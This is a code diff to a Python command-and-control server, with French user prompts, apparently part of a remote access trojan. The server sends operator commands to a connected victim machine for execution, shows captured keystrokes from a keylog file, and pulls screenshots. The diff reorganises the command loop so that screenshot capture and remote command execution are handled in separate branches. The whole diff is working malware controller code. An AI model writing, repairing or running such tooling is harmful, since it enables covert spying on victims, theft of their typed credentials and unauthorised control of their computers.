@@ -11,7 +11,8 @@ def handle_connection(connection, address):
     while True:
         try:
             command = input(
-                "Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+                "Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : "
+            )
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -23,18 +24,9 @@ def handle_connection(connection, address):
                         print(f"Contenu du Keylogger :\n{keylog.read()}")
                 except FileNotFoundError:
                     print("Aucun fichier keylog trouvé.")
-            else:
+
+            elif command.lower() == 'screenshot':
                 connection.send(command.encode())
-
-                response = connection.recv(4096).decode()
-                if not response:
-                    break
-
-                print(f"Output:\n{response}")
-
-            connection.send(command.encode())
-
-            if command.lower() == 'screenshot':
                 img_size = int(connection.recv(1024).decode())
                 connection.send(b'OK')
                 img_data = b''
@@ -48,6 +40,15 @@ def handle_connection(connection, address):
                     f.write(img_data)
                 print("Capture réussie !")
                 continue
+
+            else:
+                connection.send(command.encode())
+
+                response = connection.recv(4096).decode()
+                if not response:
+                    break
+
+                print(f"Output:\n{response}")
 
         except Exception as e:
             print(f"Error: {e}")
